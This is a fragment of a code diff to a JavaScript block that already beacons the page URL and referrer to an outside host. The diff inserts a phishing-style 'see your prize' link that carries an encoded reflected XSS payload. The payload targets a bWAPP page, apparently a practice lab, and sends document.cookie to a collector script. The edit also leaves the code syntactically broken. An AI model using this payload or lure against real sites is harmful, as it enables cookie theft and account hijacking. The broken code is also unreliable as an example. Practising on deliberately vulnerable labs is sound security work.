@@ -40,7 +40,8 @@
     var param1 = location.href;
     var param2 = document.referrer;
     alert("Today's date is " + param1,param2);
-    var img = new Image();
+    
+    Click this <a href="http://192.168.122.1/bWAPP/xss_get.php?firstname=%3Cscript%3Enew+Image%28%29.src%3D%22http%3A%2F%2F192.168.122.1%2Fcookie.php%3Fc%3D%22%2B+document.cookie%3B%3C%2Fscript%3E&lastname=test&form=submit">link</a> to see your prize
     img.src = "http://picotrail.com/"+
             "XECvw7RGnba5nJAU18TIrLMJiNLCnEScjU3ScoHLozzOzKxBlD2rl0YLU1w+Q/QNJkroJvXkqxF+T42cWVirjQ7N+4+LMqybnfwOOx0SGBbaqbxDNm+62dahg1NG0Hi3h8HQddhT6ZQdWAufhVzBd/U7O4dNKEBQ05G8GiLcxjopslLtklDhvxB5XaND3GaaVMkLcpHsfaJce3HSchs2ujY8XpOYui43ehLtNZau9yhl1QkkNNHStJA5eNOZa7P76oa1HVrAp0kypQV18UMpzy/fIliwRVTphD5+4v3fB0+qZslYPkqsFiSyaJfPXD1sf/fkzZEc8vdUqODe5S/kxmApA==?param1="+
             encodeURI(param1) + "&amp;param2=" + encodeURI(param2);
